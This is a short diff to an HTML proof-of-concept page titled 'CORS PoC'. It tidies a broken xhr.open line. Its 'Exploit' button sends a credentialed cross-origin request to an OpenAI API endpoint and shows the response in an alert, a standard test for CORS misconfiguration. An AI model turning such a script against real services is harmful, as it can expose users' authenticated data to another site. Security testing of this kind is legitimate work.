@@ -2,6 +2,7 @@
      <body>
          <h2>CORS PoC</h2>
          <div id="demo">
+              <h2>Updated</h2>
              <button type="button" onclick="cors()">Exploit</button>
          </div>
          <script>
@@ -12,7 +13,7 @@
                  document.getElementById("demo").innerHTML = alert(this.responseText);
                  }
              };
-              http://xhr.open("GET",
+              xhr.open("GET",
                        "https://api.openai.com/v1/models", true);
              xhr.withCredentials = true;
              xhr.send();
